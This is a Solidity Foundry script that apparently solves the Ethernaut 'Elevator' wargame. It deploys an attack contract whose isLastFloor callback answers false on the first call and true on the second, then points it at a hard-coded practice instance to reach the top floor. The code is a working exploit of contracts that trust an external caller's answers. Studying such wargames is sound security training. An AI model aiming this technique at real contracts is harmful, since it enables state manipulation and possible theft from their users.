// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface Elevator {
    function goTo(uint256 _floor) external;
}

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorAttack is Building {
    Elevator public target;
    bool private called;

    constructor(address _target) {
        target = Elevator(_target);
    }
    function isLastFloor(uint256) external override returns (bool) {
        if (!called) {
            called = true;
            return false;
        }
        return true;
    }

    function attack(uint256 _floor) external {
        target.goTo(_floor);
    }
}

contract Elevatorsolution is Script {
    function run() external {
        address instance =0x2ABB4A08111c8d9fDB886B592A80c50caDda2867;

        vm.startBroadcast();
        ElevatorAttack ELV = new ElevatorAttack (instance);
        ELV.attack(5);
        vm.stopBroadcast();
    }
}